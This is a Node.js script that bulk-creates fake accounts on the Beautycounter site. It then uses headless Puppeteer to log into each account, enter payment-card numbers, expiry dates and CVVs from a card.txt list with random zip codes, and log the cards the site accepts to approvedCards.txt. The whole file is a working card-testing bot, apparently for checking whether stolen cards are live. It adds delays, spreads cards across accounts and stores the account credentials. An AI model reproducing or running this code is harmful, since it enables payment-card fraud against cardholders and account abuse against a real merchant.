// import got from "got";
// import fs from "fs";
// import async from "async";
// import cheerio from "cheerio";
// import http  from 'http';

// import { CookieJar } from "tough-cookie";
// const expect= require('expect-puppeteer');

const Chance = require("chance");
const prompt = require("prompt");
const readline = require("readline");
const puppeteer = require("puppeteer");
const replaceLine = require("replace-in-file");
var fs = require("fs");
let request = require("request-promise");

prompt.start();

//scgema for getting input
let schema = {
  properties: {
    createAccounts: {
      description: "Should I create accounts",
      validator: /y[es]|n[o]?/,
      warning: "Must respond yes or no",
      default: "no",
      required: true,
      before: (v) => !!v.match(/^y/i),
    },
    createAccountsCount: {
      description: "How many accounts should create",
      type: "integer",
      default: 15,
      required: true,
      ask: () => !!prompt.history("createAccounts").value,
    },
    addCards: {
      description: "Should I add cards now",
      validator: /y[es]|n[o]?/,
      warning: "Must respond yes or no",
      default: "no",
      required: true,
      before: (v) => !!v.match(/^y/i),
    },
  },
};

prompt.get(schema, function (err, result) {
  if (result.createAccounts == true && result.addCards == true) {
    signUp(result.createAccountsCount);
    addCards();
  } else if (result.createAccounts == true && result.addCards == false) {
    signUp(result.createAccountsCount);
  } else if (result.createAccounts == false && result.addCards == true) {
    addCards();
  } else {
  }
});

//signup function
async function signUp(createAccountsCount) {
  let chance = new Chance();
  let accountsArray = [];
  let emailPostFixArray = ["@gmail.com", "@hotmail.com", "@outlook.com"];
  let firstNameArray = [
    "Louis",
    "Misty",
    "Bobby",
    "Virginia",
    "Constance",
    "Toby",
    "Cheryl",
    "Robert",
    "Raymond",
    "Timothy",
    "Odessa",
    "Stephanie",
    "Paul",
    "Theodore",
    "James",
    "Randall",
    "Brandy",
    "Clifton",
  ];
  let lastNameArray = [
    "Buoy",
    "Gaudin",
    "Myers",
    "Kenyon",
    "Jimmerson",
    "Hassenfritz",
    "Clark",
    "Battey",
    "Wade",
    "Zeringue",
    "Thompson",
    "Travis",
    "Rosas",
    "Croghan",
    "Smith",
    "Trites",
    "Teague",
    "Moye",
  ];
  for (let index = 0; index < createAccountsCount; index++) {
    let emailPrefix = chance.string({
      length: 7,
      casing: "lower",
      alpha: true,
      numeric: false,
    });
    let emailPostfix =
      emailPostFixArray[Math.floor(Math.random() * emailPostFixArray.length)];
    let firstName =
      firstNameArray[Math.floor(Math.random() * firstNameArray.length)];
    let lasNname =
      lastNameArray[Math.floor(Math.random() * lastNameArray.length)];
    let emailAddress = firstName + lasNname + emailPrefix + emailPostfix;
    let password = "T6H4JpJQGq3QwAy$";
    let account = { emailAddress, password, firstName, lasNname };
    accountsArray.push(account);
  }

  const fileStream = fs.createReadStream("login.txt");

  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity,
  });
  // Note: we use the crlfDelay option to recognize all instances of CR LF
  // ('\r\n') in input.txt as a single line break.
  let alreadySignUpList = [];
  for await (const line of rl) {
    // Each line in input.txt will be successively available here as `line`.
    let emailAddressFromFile = line.split("|")[0];
    alreadySignUpList.push(emailAddressFromFile);
  }

  accountsArray.forEach((account) => {
    if (!alreadySignUpList.includes(account.emailAddress)) {
      signUpOnWebSite(account);
    }
  });
}

async function signUpOnWebSite(account) {
  try {
    let { emailAddress, password, firstName, lasNname } = account;

    var options = {
      method: "POST",
      uri: "https://beautycounter-prod.appspot.com/accounts/create",
      body: {
        firstName: firstName,
        lastName: lasNname,
        email: emailAddress,
        emailConfirmation: emailAddress,
        password: password,
        passwordConfirmation: password,
        is_subscribed: "checked",
        sailthru_subscription_source: "signup",
        language: "en-us",
        preferredLanguag: {
          US: "EN",
          CA: "EN",
        },
      },
      json: true, // Automatically stringifies the body to JSON
    };

    request(options)
      .then(function (parsedBody) {
        // POST succeeded...
        fs.appendFile(
          "login.txt",
          `${account.emailAddress}|${account.password}\r\n`,
          (err) => {
            if (err) console.log(err);
            console.log("Successfully Written to File.");
          }
        );
      })
      .catch(function (err) {
        // POST failed...
        console.log(err);
      });
  } catch (error) {
    console.log(error);
  }
}

//addCards function
async function addCards() {
  try {
    let cardArr = await readCard();
    let accountsArr = await checkLoginFile();
    if (accountsArr.length > 0) {
      for (
        let accountIndex = 0;
        accountIndex < accountsArr.length;
        accountIndex++
      ) {
        let browserInstance = await startBrowser();
        await loginEndpoint(browserInstance, accountsArr[accountIndex]);
        console.log("login successfully");
        console.log("email", accountsArr[accountIndex].split("|")[0]);
        if (cardArr.length < 100) {
          for (
            let cardIndex = accountIndex;
            cardIndex < cardArr.length - 1;
            cardIndex += 10
          ) {
            if (cardArr[cardIndex]) {
              const add_card_status = await addCardEndPoint(
                browserInstance,
                cardArr[cardIndex]
              );
              if (add_card_status == true) {
                console.log("payment--added");

                await addInApproveCards(
                  cardArr[cardIndex],
                  accountsArr[accountIndex]
                );
              } else {
                console.log("payment-failed");
              }
            }
          }
        }
        if (cardArr.length > 100 && cardArr.length < 1000) {
          for (
            let cardIndex = accountIndex;
            cardIndex < cardArr.length - 1;
            cardIndex += 100
          ) {
            if (cardArr[cardIndex]) {
              const add_card_status = await addCardEndPoint(
                browserInstance,
                cardArr[cardIndex]
              );
              if (add_card_status == true) {
                console.log("payment--added");

                await addInApproveCards(
                  cardArr[cardIndex],
                  accountsArr[accountIndex]
                );
              } else {
                console.log("payment-failed");
              }
            }
          }
        }
        browserInstance.close();
      }
    }
  } catch (error) {
    console.log(error);
  }
}

// async function markUsedAccount(account) {
//   try {
//     // Note: we use the crlfDelay option to recognize all instances of CR LF
//     const options = {
//       //Single file
//       files: "login.txt",

//       //Replacement to make (string or regex)
//       from: `${account}`,
//       to: `${account.split("|")[0]}|${account.split("|")[1]}|used`,
//     };
//     replaceLine;
//     replaceLine(options)
//       .then((changedFiles) => {
//         console.log("Modified files:", changedFiles.join(", "));
//         console.log("successfully updated");
//       })
//       .catch((error) => {
//         console.error("Error occurred:", error);
//       });
//   } catch (error) {
//     console.log(error);
//   }
// }

async function readCard() {
  try {
    const fileStream = fs.createReadStream("card.txt");

    const readLine = readline.createInterface({
      input: fileStream,
      crlfDelay: Infinity,
    });
    // Note: we use the crlfDelay option to recognize all instances of CR LF
    // ('\r\n') in input.txt as a single line break.
    let cardArray = [];

    for await (const line of readLine) {
      // Each line in input.txt will be successively available here as `line`.
      cardArray.push(line);
    }
    return cardArray;
  } catch (error) {
    console.log(error);
  }
}

async function checkLoginFile() {
  try {
    const fileStream = fs.createReadStream("login.txt");

    const rl = readline.createInterface({
      input: fileStream,
      crlfDelay: Infinity,
    });
    // Note: we use the crlfDelay option to recognize all instances of CR LF
    // ('\r\n') in input.txt as a single line break.
    let userArray = [];
    for await (const line of rl) {
      // Each line in input.txt will be successively available here as `line`.
      userArray.push(line);
    }

    return userArray;
  } catch (error) {
    console.log(error);
  }
}

function delay(timeout) {
  try {
    return new Promise((resolve) => {
      setTimeout(resolve, timeout);
    });
  } catch (error) {
    console.log(error);
  }
}

async function loginEndpoint(browser, userAccount) {
  try {
    var emailAddress = userAccount.split("|")[0];
    var password = userAccount.split("|")[1];

    const page = await browser.newPage();
    await page.goto("https://beautycounter.com/login", {
      waitUntil: "networkidle2",
    });

    await delay(5000);

    await page.waitForSelector('input[aria-describedby=" loginPage-email"]', {
      timeout: 0,
    });
    await page.waitForSelector(
      'input[aria-describedby=" loginPage-password"]',
      {
        timeout: 0,
      }
    );

    await page.type('input[aria-describedby=" loginPage-email"]', emailAddress);
    await page.type('input[aria-describedby=" loginPage-password"]', password);
    await delay(8000);

    await page.click("button[data-testid=user-signIn]");
    await page.waitForNavigation();
    await delay(15000);
  } catch (error) {
    console.log(error);
  }
}

async function addCardEndPoint(browser, card) {
  try {
    cardData = card.split("|");

    const page = await browser.newPage();
    await page.goto("https://beautycounter.com/customer/paymentinfo", {
      waitUntil: "networkidle2",
    });

    await delay(5000);
    try {
      await add_card_button(page);
    } catch (error) {
      console.log(error);
      console.log("Add card button not found");
    }
    //check if form exist
    let status = await checkExistsByXpath(
      page,
      'form[class="_2PY-W fadein forward-fill"]'
    );
    if (status == true) {
      await page.waitForSelector("iframe[name='sq-card-number']", {
        timeout: 0,
      });
      await page.waitForSelector('iframe[name="sq-expiration-date"]', {
        timeout: 0,
      });
      await page.waitForSelector('iframe[name="sq-cvv"]', {
        timeout: 0,
      });
      await page.waitForSelector('iframe[name="sq-postal-code"]', {
        timeout: 0,
      });
      await delay(8000);

      await page.type("iframe[name='sq-card-number']", cardData[0].trim());

      expire_month = cardData[1].trim();
      expire_year = cardData[2].trim();
      expire_year_origin = expire_year.slice(-2);
      exp = expire_month + expire_year_origin;
      await delay(2000);

      await page.type('iframe[name="sq-expiration-date"]', exp);
      await delay(2000);

      await page.type('iframe[name="sq-cvv"]', cardData[3]);
      const chance = new Chance();
      let zipcode = chance.string({ length: 5, alpha: false, numeric: true });

      await delay(2000);
      await page.type('iframe[name="sq-postal-code"]', zipcode);
      await delay(8000);
      try {
        await page.click("button[data-testid='paymentsForm-submit']");
        let paymentMethodAdded = await checkExistsByXpath(
          page,
          "button[data-testid='paymentsForm-submit']"
        );
        await delay(15000);
        return paymentMethodAdded ? false : true;
      } catch (error) {
        console.log(error);
        return false;
      }
    }

    await delay(150000);
  } catch (error) {
    console.log(error);
  }
}

async function checkExistsByXpath(page, path) {
  try {
    return await page.evaluate((path) => {
      let el = document.querySelector(path);
      return el != null ? true : false;
    }, path);
  } catch (error) {
    console.log(error);
  }
}

async function add_card_button(page) {
  try {
    await page.click("div[data-testid='paymentOptions-addPayment']");
    await delay(3000);
  } catch (error) {
    const [button] = await page.$x("//button[contains(., 'Add New Method')]");
    if (button) {
      await button.click();
    }
    await delay(3000);
  }
}

async function addInApproveCards(card, account) {
  try {
    fs.appendFile("approvedCards.txt", `${card}|${account}\r\n`, (err) => {
      if (err) console.log(err);
      console.log("Successfully Written to File.");
    });
  } catch (error) {}
}
async function startBrowser() {
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: true,
      args: ["--disable-setuid-sandbox"],
      ignoreHTTPSErrors: true,
    });
  } catch (err) {
    console.log("Could not create a browser instance => : ", err);
  }
  return browser;
}
